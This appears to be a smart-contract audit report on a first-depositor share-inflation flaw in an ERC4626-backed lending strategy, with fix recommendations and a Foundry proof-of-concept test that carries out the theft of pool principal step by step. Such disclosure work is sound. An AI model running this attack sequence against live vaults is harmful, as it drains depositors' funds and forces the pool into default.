### Title
ERC4626 first-depositor share inflation lets an unprivileged vault user steal programmable-borrower principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` deposits idle pool principal into an arbitrary ERC4626 vault during `onStartEpoch` but does not validate the number of shares returned or the effective entry price. If the configured vault is empty or nearly empty, an attacker can perform the classic first-depositor inflation attack: mint one share, donate enough underlying to inflate `totalAssets`, cause the pool’s deposit to mint zero or dust shares, then redeem the attacker-controlled share supply for the pool principal.

The stolen assets remain accounted for as CDO strategy-token principal because `IdleCreditVault.deposit` mints strategy tokens 1:1 while the underlying is subsequently forwarded to the programmable borrower. When withdrawals are requested, `ProgrammableBorrower` has no corresponding vault assets, making borrower funding fail and forcing default/insolvency.

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers the accumulated deposits to the configured borrower and invokes `onStartEpoch`. [1](#0-0) 

`ProgrammableBorrower.onStartEpoch` snapshots `startAssets` and calls `_depositToVault` with the entire idle balance. `_depositToVault` accepts whatever `vault.deposit` returns without a minimum-share, slippage, liquidity, or conversion check. [2](#0-1) [3](#0-2) 

For principal `P`, an attacker can:

1. Ensure the ERC4626 vault has no meaningful existing shares.
2. Deposit `1` wei and receive `1` vault share.
3. Directly transfer `D >= P` underlying to the vault.
4. Let the honest manager call `startEpoch`.
5. The pool’s `P` deposit mints approximately `P / (D + 1)` shares; with `D >= P`, a vulnerable ERC4626 can mint zero shares.
6. The attacker redeems their one share for approximately `D + P + 1`, obtaining the donated capital plus the pool principal.

The accounting baseline does not prevent this. `epochStartVaultAssets` is intentionally measured before the deposit, while `_currentVaultAssets` afterwards is based on the pool’s received shares. If the pool received zero shares, the vault position is worth zero even though `P` underlying was deposited. [4](#0-3) 

At epoch stop, `vaultLoss` is approximately `P` and `totalInterestDueNow` returns zero. More importantly, when pending withdrawals need cash, `onStopEpoch` sees that the shortfall exceeds `_currentVaultAssets`, returns success, and the subsequent CDO `transferFrom` fails because the programmable borrower no longer holds the principal. [5](#0-4) [6](#0-5) [7](#0-6) 

### Impact Explanation
The attacker can steal up to the entire principal deposited into an empty or nearly empty ERC4626 vault. With a donation `D >= P`, the attacker commits about `P + 1` capital and redeems about `2P + 1`, yielding profit of about `P` stolen from pool principal.

The CDO is left with minted strategy tokens representing principal that no longer exists in the programmable borrower. `IdleCreditVault.deposit` mints those strategy tokens 1:1 for underlyings supplied by the CDO, but `startEpoch` later forwards the cash to the programmable borrower. [8](#0-7)  The resulting loss can be equal to the full epoch funding amount and ultimately causes withdrawal funding failure/default rather than merely an accounting discrepancy.

### Likelihood Explanation
Likelihood depends on deployment state: the ERC4626 vault must be empty or sufficiently illiquid when `onStartEpoch` first deposits pool capital. That condition is realistic for a newly configured programmable-borrower facility or after an existing vault position has been fully unwound.

The attacker needs no privileged role. They only interact with the public ERC4626 vault before an honest manager calls `startEpoch`. The current code explicitly permits generic ERC4626 vaults matching the underlying asset and imposes no minimum initial liquidity or minimum shares. [9](#0-8) 

### Recommendation
- Require the ERC4626 vault to have established liquidity and minimum `totalSupply` before using it as the programmable-borrower destination.
- In `_depositToVault`, calculate `previewDeposit(_assetAmount)` and require `shares >= minSharesOut`.
- After deposit, verify `convertToAssets(receivedShares)` is approximately equal to `_assetAmount`; revert on a material discount.
- Seed the vault atomically during deployment/initialization rather than allowing a public depositor to create the first share.
- Prefer vaults with built-in virtual-share inflation resistance, but do not rely solely on that property; retain explicit slippage and liquidity checks.
- Consider reverting `onStartEpoch` when the received share balance is zero for a nonzero deposit.

### Proof of Concept
Foundry fork/test sequence against a programmable-borrower deployment:

```solidity
function testProgrammableBorrowerVaultFirstDepositorTheft() public {
    // Fork at a state where PB's configured ERC4626 vault is empty.
    uint256 principal = 1_000_000e6;

    address attacker = makeAddr("attacker");
    IERC4626 vault = programmableBorrower.vault();
    IERC20Detailed underlying = programmableBorrower.underlyingToken();

    // 1. Attacker creates the first share and inflates its price.
    deal(address(underlying), attacker, principal + 1);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    uint256 attackerShares = vault.deposit(1, attacker);
    underlying.transfer(address(vault), principal);
    vm.stopPrank();

    assertEq(vault.totalSupply(), attackerShares);

    // 2. Honest LP deposits principal. The strategy mints CDO strategy tokens 1:1.
    deal(address(underlying), lender, principal);
    vm.startPrank(lender);
    underlying.approve(address(cdoEpoch), principal);
    cdoEpoch.depositAA(principal);
    vm.stopPrank();

    // 3. Honest manager starts the epoch. PB deposits all idle principal
    //    into the inflated vault and receives zero/dust shares.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    uint256 cdoVaultShares = vault.balanceOf(address(programmableBorrower));
    assertEq(cdoVaultShares, 0);

    // 4. Attacker redeems their share and receives their donation plus pool principal.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(attackerShares, attacker, attacker);

    assertApproxEqAbs(
        underlying.balanceOf(attacker) - attackerBefore,
        principal + principal + 1,
        2
    );

    // 5. PB retains no vault backing despite CDO strategy-token principal.
    assertEq(programmableBorrower.totalUnderlying(), 0);
    assertEq(IERC20(strategyToken).balanceOf(address(cdoEpoch)), principal);

    // 6. Once withdrawals mature, stopEpoch cannot source the requested cash.
    //    The transferFrom fails and the CDO enters the default path.
}
```

For a fork where the integrated vault is already seeded, deploy or select a replacement vault in the same empty state and configure it before first funding. The production defect is the absence of minimum-share and entry-price validation in `ProgrammableBorrower._depositToVault`, not a property of the PoC vault itself.
